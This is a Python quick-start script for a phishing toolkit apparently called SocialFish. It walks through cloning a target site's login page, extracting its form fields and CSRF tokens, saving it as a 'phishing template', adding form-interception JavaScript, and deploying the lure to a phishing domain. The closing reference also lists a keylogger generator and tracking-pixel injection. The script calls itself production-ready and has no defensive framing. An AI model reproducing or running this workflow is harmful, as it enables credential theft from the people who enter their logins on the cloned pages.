#!/usr/bin/env python3
"""
Quick Start Guide for Enhanced Cloning Features
Shows practical examples of using the new features
"""

# ============================================================================
# QUICK START: Enhanced Website Cloning Features
# ============================================================================

"""
This guide demonstrates how to use the new cloning features in SocialFish.
All examples are production-ready code.
"""

# 1. BASIC FORM CAPTURE EXAMPLE
# ============================================================================

from features.cloning import FormDataCapture, FormFieldAnalyzer
import requests
from bs4 import BeautifulSoup

# Get target website
target_url = "https://example.com/login"
response = requests.get(target_url)
html = response.text

# Analyze forms on the page
capture = FormDataCapture()
forms = capture.capture_form_data(html, target_url, clone_id="example_clone_001")

# Display captured form information
print("=" * 60)
print("CAPTURED FORMS")
print("=" * 60)

for form in forms:
    print(f"\nForm ID: {form['form_id']}")
    print(f"Action: {form['action']}")
    print(f"Method: {form['method']}")
    print(f"Enctype: {form['enctype']}")
    
    print("\nFields:")
    for field in form['fields']:
        category = field['category']
        print(f"  - {field['name']:20} ({category:12}) - Required: {field['required']}")
    
    print("\nCSRF Tokens Found:")
    for token in form['csrf_tokens']:
        print(f"  - {token['name']}: {token['value'][:50]}...")
    
    print(f"\nMulti-step form: {form['is_multistep']}")
    print(f"File upload supported: {form['supports_file_upload']}")


# 2. CREATE AND SAVE LURE TEMPLATE
# ============================================================================

from features.cloning import LureManager

# Initialize lure manager
lure_mgr = LureManager(database_path='./database.db')

# Create a new template
result = lure_mgr.create_template(
    name="Example.com Login Phishing",
    url=target_url,
    clone_id="example_clone_001",
    description="Phishing template for example.com login",
    tags=["example", "login", "phishing", "v1"],
    created_by="admin"
)

if result['status'] == 'ok':
    template_id = result['template_id']
    print(f"\n✓ Template created: {template_id}")
    
    # Add form configuration to template
    lure_mgr.save_forms_config(template_id, forms)
    print("✓ Form configuration saved")
    
    # Add custom JavaScript
    custom_js = """
    console.log('Lure page loaded');
    // Custom interception code here
    """
    lure_mgr.add_custom_js(template_id, custom_js)
    print("✓ Custom JavaScript added")


# 3. DYNAMIC PAGE CLONING (JavaScript-Heavy Sites)
# ============================================================================

from features.cloning import DynamicPageCloner
import asyncio

# Clone a modern JavaScript-rendered page
async def clone_modern_site():
    cloner = DynamicPageCloner()
    
    result = await cloner.clone_dynamic_page(
        url="https://example.com/login",
        wait_for_selector="#login-form",  # Wait for this element
        wait_time=5000,  # 5 seconds max
        include_assets=True
    )
    
    if result['status'] == 'ok':
        print(f"\n✓ Dynamic page cloned: {result['clone_id']}")
        print(f"  Clone URL: {result['clone_url']}")
        print(f"  Forms found: {len(result['metadata']['forms'])}")
        
        # Return clone info for next steps
        return result['clone_id'], result['metadata']
    else:
        print(f"\n✗ Clone failed: {result['message']}")
        return None, None

# Run async cloning (if needed for modern sites)
# clone_id, metadata = asyncio.run(clone_modern_site())


# 4. DOWNLOAD AND MANAGE ASSETS
# ============================================================================

from features.cloning import AssetDownloader
from pathlib import Path

# Initialize asset downloader
downloader = AssetDownloader(timeout=15)

# Download all assets from cloned page
clone_path = Path("./templates/clones/example_clone_001")

assets_info = downloader.download_assets_from_html(
    html=html,
    base_url=target_url,
    clone_path=clone_path,
    asset_types=['css', 'js', 'images']  # Types to download
)

print(f"\n✓ Assets downloaded:")
print(f"  CSS files: {len(assets_info['css'])}")
print(f"  JavaScript: {len(assets_info['js'])}")
print(f"  Images: {len(assets_info['images'])}")
print(f"  Total size: {assets_info['total_size'] / 1024:.2f} KB")

if assets_info['download_errors']:
    print(f"  Errors: {len(assets_info['download_errors'])}")
    for error in assets_info['download_errors'][:3]:
        print(f"    - {error}")


# 5. COMPLETE WORKFLOW: CLONE -> CAPTURE -> TEMPLATE -> DEPLOY
# ============================================================================

def complete_phishing_workflow(target_url: str):
    """
    Complete workflow for creating a phishing lure
    """
    
    print("\n" + "=" * 60)
    print("COMPLETE PHISHING WORKFLOW")
    print("=" * 60)
    
    # Step 1: Clone the website
    print("\n[1/5] Cloning website...")
    from core.real_cloner import RealCloner
    cloner = RealCloner()
    clone_result = cloner.clone_website(target_url, include_assets=True)
    
    if clone_result['status'] != 'ok':
        print(f"✗ Cloning failed: {clone_result['message']}")
        return None
    
    clone_id = clone_result['clone_id']
    print(f"✓ Website cloned: {clone_id}")
    
    # Step 2: Capture forms
    print("\n[2/5] Capturing form data...")
    capture = FormDataCapture()
    forms = capture.capture_form_data(html, target_url, clone_id)
    print(f"✓ Captured {len(forms)} forms")
    for i, form in enumerate(forms, 1):
        print(f"  Form {i}: {len(form['fields'])} fields, {len(form['csrf_tokens'])} CSRF tokens")
    
    # Step 3: Create template
    print("\n[3/5] Creating lure template...")
    lure_mgr = LureManager()
    template_result = lure_mgr.create_template(
        name=f"{target_url.split('//')[1]} Phishing Lure",
        url=target_url,
        clone_id=clone_id,
        tags=["phishing", "auto-created"],
        created_by="system"
    )
    
    if template_result['status'] != 'ok':
        print(f"✗ Template creation failed: {template_result['message']}")
        return None
    
    template_id = template_result['template_id']
    print(f"✓ Template created: {template_id}")
    
    # Step 4: Configure template
    print("\n[4/5] Configuring template...")
    lure_mgr.save_forms_config(template_id, forms)
    
    from features.cloning import FormInterceptor
    interceptor_js = FormInterceptor.generate_form_interception_js(clone_id)
    lure_mgr.add_custom_js(template_id, interceptor_js)
    print("✓ Template configured with form interception")
    
    # Step 5: Deploy
    print("\n[5/5] Deploying lure...")
    deployment = lure_mgr.create_deployment(
        template_id=template_id,
        deployed_url=f"https://phishing-domain.com/{clone_id}",
        notes="Automatic deployment from workflow"
    )
    
    if deployment['status'] == 'ok':
        print(f"✓ Lure deployed: {deployment['deployed_url']}")
        return {
            'clone_id': clone_id,
            'template_id': template_id,
            'deployment_id': deployment['deployment_id'],
            'deployed_url': deployment['deployed_url'],
            'forms_count': len(forms)
        }
    else:
        print(f"✗ Deployment failed: {deployment['message']}")
        return None


# 6. FIELD TYPE IDENTIFICATION EXAMPLES
# ============================================================================

print("\n" + "=" * 60)
print("FIELD TYPE IDENTIFICATION EXAMPLES")
print("=" * 60)

examples = [
    ("email", "email", ""),
    ("username", "text", ""),
    ("password", "password", ""),
    ("user_phone", "tel", ""),
    ("otp_code", "text", ""),
    ("_csrf", "hidden", ""),
    ("remember_me", "checkbox", ""),
    ("login_method", "select", ""),
]

analyzer = FormFieldAnalyzer()

for field_name, field_type, html in examples:
    category = analyzer.identify_field_type(field_name, field_type, html)
    print(f"{field_name:20} ({field_type:10}) -> {category}")


# 7. LIST AND MANAGE TEMPLATES
# ============================================================================

print("\n" + "=" * 60)
print("TEMPLATE MANAGEMENT")
print("=" * 60)

lure_mgr = LureManager()

# List all templates
templates = lure_mgr.list_templates()
print(f"\nTotal templates: {len(templates)}")

for template in templates[:5]:  # Show first 5
    print(f"\n  {template['name']}")
    print(f"    ID: {template['template_id']}")
    print(f"    URL: {template['url']}")
    print(f"    Tags: {', '.join(template['tags'])}")
    print(f"    Created: {template['created_at']}")
    print(f"    Used: {template['usage_count']} times")

# Get specific template details
if templates:
    template_id = templates[0]['template_id']
    details = lure_mgr.get_template(template_id)
    
    print(f"\n\nTemplate Details for {template_id}:")
    print(f"  Forms configured: {len(details['forms_config'])}")
    print(f"  Custom JS: {len(details['custom_js'])} bytes")
    print(f"  Custom CSS: {len(details['custom_css'])} bytes")
    print(f"  Assets: {len(details['assets'])} items")


# 8. CSRF TOKEN EXTRACTION
# ============================================================================

from features.cloning import CsrfTokenExtractor
from bs4 import BeautifulSoup

print("\n" + "=" * 60)
print("CSRF TOKEN EXTRACTION")
print("=" * 60)

# Example HTML with various CSRF tokens
example_html = """
<html>
<head>
    <meta name="_token" content="abc123def456"/>
</head>
<body>
    <form>
        <input type="hidden" name="csrf_token" value="xyz789uv"/>
        <input type="hidden" name="authenticity_token" value="form_token_123"/>
    </form>
</body>
</html>
"""

soup = BeautifulSoup(example_html, 'html.parser')
tokens = CsrfTokenExtractor.extract_csrf_tokens(soup)

print("\nExtracted CSRF Tokens:")
for name, value in tokens.items():
    print(f"  {name}: {value}")


# 9. EXPORT AND IMPORT TEMPLATES
# ============================================================================

print("\n" + "=" * 60)
print("TEMPLATE IMPORT/EXPORT")
print("=" * 60)

lure_mgr = LureManager()

if templates:
    template_id = templates[0]['template_id']
    
    # Export template
    export_path = f"./exported_template_{template_id[:8]}.json"
    success = lure_mgr.export_template(template_id, export_path)
    
    if success:
        print(f"\n✓ Template exported to: {export_path}")
        
        # Import template
        new_id = lure_mgr.import_template(export_path)
        print(f"✓ Template imported with new ID: {new_id}")


# 10. ERROR HANDLING EXAMPLE
# ============================================================================

print("\n" + "=" * 60)
print("ERROR HANDLING")
print("=" * 60)

def safe_form_capture(url: str) -> list:
    """
    Example of proper error handling
    """
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        
        capture = FormDataCapture()
        forms = capture.capture_form_data(response.text, url)
        
        print(f"✓ Successfully captured {len(forms)} forms")
        return forms
        
    except requests.exceptions.Timeout:
        print(f"✗ Request timeout for {url}")
        return []
    except requests.exceptions.ConnectionError:
        print(f"✗ Connection error for {url}")
        return []
    except requests.exceptions.RequestException as e:
        print(f"✗ Request error: {e}")
        return []
    except Exception as e:
        print(f"✗ Unexpected error: {e}")
        return []

# Test with valid URL
forms = safe_form_capture("https://example.com")


# ============================================================================
# CONFIGURATION REFERENCE
# ============================================================================

"""
Configuration Options:

FormDataCapture:
  - analyze_form(form, base_url, clone_id) -> Dict
  - capture_form_data(html, base_url, clone_id) -> List[Dict]

LureManager:
  - create_template(name, url, clone_id, description, tags, created_by) -> Dict
  - save_forms_config(template_id, forms_config) -> bool
  - add_custom_js(template_id, js_code) -> bool
  - add_custom_css(template_id, css_code) -> bool
  - list_templates(tags) -> List[Dict]
  - get_template(template_id) -> Dict
  - create_deployment(template_id, deployed_url, notes) -> Dict
  - export_template(template_id, filepath) -> bool
  - import_template(filepath) -> str (template_id)

DynamicPageCloner:
  - clone_dynamic_page(url, wait_for_selector, wait_time, include_assets) -> Dict
  - record_user_interaction(url, actions) -> Dict

AssetDownloader:
  - download_assets_from_html(html, base_url, clone_path, asset_types) -> Dict
  - optimize_css(css_content) -> str
  - optimize_javascript(js_content) -> str
  - inject_tracking_pixel(html, pixel_url) -> str
  - clear_cache() -> None

FormFieldAnalyzer:
  - identify_field_type(field_name, field_type, field_html) -> str

CsrfTokenExtractor:
  - extract_csrf_tokens(soup, form_element) -> Dict[str, str]
  - preserve_csrf_tokens(form) -> List[Dict]

FormInterceptor:
  - generate_form_interception_js(clone_id) -> str
  - generate_keylogger_js() -> str
"""

print("\n" + "=" * 60)
print("Quick Start Complete!")
print("=" * 60)
print("\nFor more information, see:")
print("  - ENHANCED_CLONING_FEATURES.md")
print("  - PROJECT_RESTRUCTURE_GUIDE.md")
print("  - features/cloning/ (source code)")
